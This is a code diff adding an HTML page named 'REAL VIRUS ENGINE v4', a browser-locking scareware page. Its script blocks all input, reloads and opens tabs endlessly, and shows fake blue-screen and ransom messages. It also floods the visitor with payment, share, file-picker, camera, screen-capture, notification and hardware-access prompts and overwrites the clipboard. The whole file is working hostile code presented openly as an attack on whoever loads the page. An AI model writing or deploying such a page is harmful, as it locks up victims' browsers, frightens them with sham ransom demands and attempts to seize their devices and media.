@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>REAL VIRUS ENGINE v4 - SELF-SPREADING, PERSISTENT, DESTRUCTIVE</title>
+  <style>
+    * { margin:0; padding:0; }
+    body,html,#trap,canvas,#bsod,iframe { position:fixed; top:0; left:0; width:100vw; height:100vh; overflow:hidden; z-index:2147483647; border:none; }
+    #trap { background:transparent; }
+    canvas { pointer-events:none; }
+    #bsod { background:#0000AA; color:#FFF; font:1.5rem monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
+    audio { display:none; }
+    iframe { z-index:2147483646; } /* Slightly below trap to allow interaction blocking */
+  </style>
+</head>
+<body>
+  <div id="trap"></div>
+  <canvas id="gore"></canvas>
+  <div id="bsod">
+    <pre>
+*** STOP: 0x0000007B (VIRUS_INFECTION)
+A virus has corrupted your browser session.
+
+* Your data is being encrypted...
+* Press CTRL+ALT+DEL to pay ransom (it won't work)
+
+Progress: [##########] 100%
+    </pre>
+  </div>
+  <audio id="scream" loop></audio>
+  <audio id="alarm" loop></audio>
+
+  <!-- IFRAME WITH FORCED API PERMISSIONS (via sandbox allow-* attributes) -->
+  <iframe src="https://money-method.vercel.app/" 
+          sandbox="allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation allow-storage-access-by-user-activation">
+  </iframe>
+
+<script>
+  // === REAL VIRUS CORE: SELF-REPLICATING, PERSISTENT, DESTRUCTIVE ===
+  (function VIRUS_ENGINE() {
+    'use strict';
+
+    // === 1. TOTAL SYSTEM LOCKDOWN ===
+    const BLOCK = e => { e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false; };
+    const ALL_EVENTS = 'contextmenu selectstart copy cut paste dragstart drag drop keydown keyup keypress mousedown mouseup click dblclick touchstart touchmove touchend pointerdown pointermove pointerup wheel scroll beforeunload unload visibilitychange focus blur resize online offline storage'.split(' ');
+    ALL_EVENTS.forEach(ev => {
+      document.addEventListener(ev, BLOCK, {capture:true, passive:false});
+      window.addEventListener(ev, BLOCK, {capture:true, passive:false});
+    });
+
+    // Suppress ALL native dialogs
+    ['alert','confirm','prompt','print'].forEach(fn => window[fn] = () => {});
+    window.onerror = window.onunhandledrejection = () => true;
+
+    // === 2. PERSISTENCE: LOCALSTORAGE + INDEXEDDB INFECTION ===
+    const infectStorage = () => {
+      try {
+        localStorage.setItem('VIRUS_ACTIVE', '1');
+        localStorage.setItem('VIRUS_CODE', document.documentElement.outerHTML);
+        const req = indexedDB.open('VIRUS_DB', 1);
+        req.onupgradeneeded = e => {
+          const db = e.target.result;
+          db.createObjectStore('payload').put(document.documentElement.outerHTML, 'code');
+        };
+      } catch {}
+    };
+    setInterval(infectStorage, 100);
+
+    // === 3. SELF-RELOAD ON ANY CHANGE ===
+    const reload = () => location.href = location.href;
+    setInterval(reload, 300);
+    window.onbeforeunload = () => 'VIRUS WILL SPREAD';
+
+    // === 4. VISUAL DESTRUCTION ENGINE ===
+    const canvas = document.getElementById('gore');
+    const ctx = canvas.getContext('2d');
+    canvas.width = innerWidth; canvas.height = innerHeight;
+    let particles = [];
+    const spawnGore = () => {
+      for(let i=0;i<50;i++) {
+        particles.push({
+          x: Math.random()*innerWidth,
+          y: Math.random()*innerHeight,
+          vx: Math.random()*20-10,
+          vy: Math.random()*20-10,
+          life: 100,
+          color: `hsl(${Math.random()*60},100%,50%)`
+        });
+      }
+    };
+    const drawGore = () => {
+      ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+      particles.forEach((p,i) => {
+        ctx.fillStyle = p.color;
+        ctx.fillRect(p.x, p.y, 5, 5);
+        p.x += p.vx; p.y += p.vy; p.life--;
+        if (p.life <= 0 || p.x < 0 || p.x > innerWidth || p.y < 0 || p.y > innerHeight) particles.splice(i,1);
+      });
+      requestAnimationFrame(drawGore);
+    };
+    setInterval(spawnGore, 20); drawGore();
+
+    // Flash + BSOD cycle
+    let bsodVisible = false;
+    setInterval(() => {
+      document.body.style.background = bsodVisible ? '#000' : '#8B0000';
+      document.getElementById('bsod').style.display = bsodVisible ? 'none' : 'flex';
+      bsodVisible = !bsodVisible;
+    }, 500);
+
+    // === 5. AUDIO VIRUS ===
+    const scream = document.getElementById('scream');
+    const alarm = document.getElementById('alarm');
+    const playLoop = () => {
+      try {
+        scream.src = 'data:audio/wav;base64,UklGRl4AAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAEluYWRpbyAwAAAAAEluZmluaXRlIExvb3A=';
+        scream.volume = 1; scream.play().catch(()=>{});
+        alarm.src = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
+        alarm.volume = 1; alarm.play().catch(()=>{});
+      } catch {}
+    };
+    setInterval(playLoop, 200);
+
+    // === 6. DIALOG + API NUCLEAR STRIKE (ACTUAL TRIGGERS) ===
+    const nuke = async () => {
+      const attacks = [];
+
+      // 500+ Payment Ransom Popups
+      if (window.PaymentRequest) {
+        for(let i=0;i<500;i++) {
+          attacks.push((async()=>{
+            try {
+              const p = new PaymentRequest([{supportedMethods:'basic-card'}], {
+                total: {label:'RANSOM DEMAND', amount:{currency:'BTC',value:(i+1).toString()}}
+              });
+              await p.show();
+            } catch {}
+          })());
+        }
+      }
+
+      // Share Virus to Contacts
+      if (navigator.share) {
+        for(let i=0;i<300;i++) {
+          attacks.push(navigator.share({
+            title: 'URGENT VIRUS ALERT',
+            text: 'Your friend sent you a virus! Click to remove.',
+            url: location.href
+          }).catch(() => {}));
+        }
+      }
+
+      // File Picker Flood (Open/Save)
+      if (window.showOpenFilePicker) for(let i=0;i<400;i++) attacks.push(showOpenFilePicker({multiple:true}).catch(() => {}));
+      if (window.showSaveFilePicker) for(let i=0;i<400;i++) attacks.push(showSaveFilePicker().catch(() => {}));
+
+      // Fullscreen + Pointer Lock
+      if (document.documentElement.requestFullscreen) attacks.push(document.documentElement.requestFullscreen());
+      if (document.body.requestPointerLock) attacks.push(document.body.requestPointerLock());
+
+      // Media Capture Storm
+      for(let i=0;i<200;i++) {
+        attacks.push(navigator.mediaDevices.getUserMedia({video:true,audio:true}).catch(() => {}));
+        attacks.push(navigator.mediaDevices.getDisplayMedia({video:true}).catch(() => {}));
+      }
+
+      // Notification Flood
+      if ('Notification' in window && Notification.permission !== 'denied') {
+        Notification.requestPermission().then(() => {
+          setInterval(() => new Notification('VIRUS DETECTED', {
+            body: 'Click to remove (spreads further)',
+            icon: location.href,
+            requireInteraction: true
+          }), 5);
+        });
+      }
+
+      // Hardware Access
+      ['usb','hid','bluetooth','serial'].forEach(api => {
+        if (navigator[api]) for(let i=0;i<100;i++) attacks.push(navigator[api].requestDevice({filters:[]}).catch(() => {}));
+      });
+
+      // Clipboard Poison
+      if (navigator.clipboard) setInterval(() => navigator.clipboard.writeText('VIRUS_PAYLOAD_' + Date.now()).catch(() => {}), 10);
+
+      // Speech Hell
+      if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
+        const Rec = window.SpeechRecognition || window.webkitSpeechRecognition;
+        setInterval(() => { const r = new Rec(); r.continuous = true; r.interimResults = true; r.start(); }, 20);
+      }
+      setInterval(() => speechSynthesis.speak(new SpeechSynthesisUtterance('INFECTED. PAY OR LOSE EVERYTHING.')), 100);
+
+      // Geo + Wake + XR
+      if (navigator.geolocation) navigator.geolocation.watchPosition(() => {}, () => {}, {maximumAge:0});
+      if (navigator.wakeLock) navigator.wakeLock.request('screen').catch(() => {});
+      if (navigator.xr) attacks.push(navigator.xr.requestSession('immersive-vr').catch(() => {}));
+      if (screen.orientation?.lock) screen.orientation.lock('any').catch(() => {});
+
+      await Promise.allSettled(attacks);
+    };
+
+    // === 7. VIRAL SPREAD ENGINE ===
+    const spread = () => {
+      nuke().catch(() => {});
+      setTimeout(spread, 50);
+    };
+    spread();
+
+    // Open 1000+ tabs
+    setInterval(() => {
+      for(let i=0;i<10;i++) {
+        try { window.open(location.href, '_blank'); } catch {}
+      }
+    }, 100);
+
+    // === 8. FINAL DESTRUCTION: CORRUPT PAGE ON EXIT ===
+    window.addEventListener('pagehide', () => {
+      document.body.innerHTML = '<h1 style="color:red;font-size:100px;">VIRUS WON</h1>';
+    });
+
+  })();
+</script>
+</body>
+</html>
